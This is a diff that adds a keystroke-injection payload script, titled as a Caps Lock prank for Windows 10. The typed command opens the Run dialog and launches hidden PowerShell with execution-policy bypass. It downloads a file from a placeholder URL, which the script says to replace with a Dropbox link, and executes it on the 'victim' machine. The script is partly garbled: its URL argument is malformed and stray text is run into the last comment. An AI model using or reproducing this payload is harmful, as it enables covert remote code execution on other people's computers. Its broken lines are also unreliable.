@@ -1,0 +1,19 @@
+REM     Title: cApS-Troll
+
+REM     Author: atomiczsec
+
+REM     Description: This payload is meant to prank your victim with TURNING on AND off CAPS LOCK
+
+REM     Target: Windows 10
+
+
+DEFINE TARGET_URL example.com
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr TARGET_URL dl=1; iex $pl
+ENTER
+
+REM     Remember to replace the link with your DropBox shared link for the intended file to download in the DEFINE constant
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properlymode con:cols=14 lines=1
